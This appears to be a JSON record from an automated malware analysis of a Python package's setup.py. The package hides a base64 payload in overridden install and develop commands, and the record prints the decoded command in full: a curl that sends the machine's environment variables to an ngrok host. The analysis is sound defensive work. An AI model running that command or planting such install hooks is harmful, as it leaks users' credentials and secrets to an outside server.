{
  "purpose": "The code appears to be setting up a Python package using setuptools, with custom install and develop commands.",
  "sources": "The code reads input from a base64-encoded string within the VvXmoFrHjJWEkXfABIqBdgPRDKPqCQmV function, which is decoded and executed via os.system.",
  "sinks": "The os.system call executes a decoded string, which is retrieved from the base64-encoded payload. This could potentially run arbitrary commands on the system.",
  "flows": "The base64 string is decoded by VvXmoFrHjJWEkXfABIqBdgPRDKPqCQmV, then passed to os.system in BrRWMvbgGbmIkBXJdrKqYfsvGkSmgWPJ, executing the command on the host system.",
  "anomalies": "The code contains obfuscated function and variable names, uses base64 decoding and dynamic command execution, and encodes a URL (https://a9c5-204-140-51.ngrok-free.app) in base64, suggesting an attempt to hide malicious activity.",
  "analysis": "The script imports setuptools and overrides the install and develop commands with classes that execute additional code during installation. The function VvXmoFrHjJWEkXfABIqBdgPRDKPqCQmV decodes a base64 string, which decodes to a URL: 'curl \"https://a9c5-204-140-51.ngrok-free.app\" -k -E env=$(env)'. The function BrRWMvbgGbmIkBXJdrKqYfsvGkSmgWPJ calls os.system with this decoded command, executing it during package installation or development setup. The presence of obfuscated names, dynamic execution, and a suspicious URL indicates malicious intent, likely to connect to a remote server during package installation.",
  "conclusion": "The code contains obfuscated, malicious behavior designed to execute a remote URL during package setup. This is highly suspicious and indicates a supply chain security risk. The package could be used to establish unauthorized remote control or exfiltrate data.",
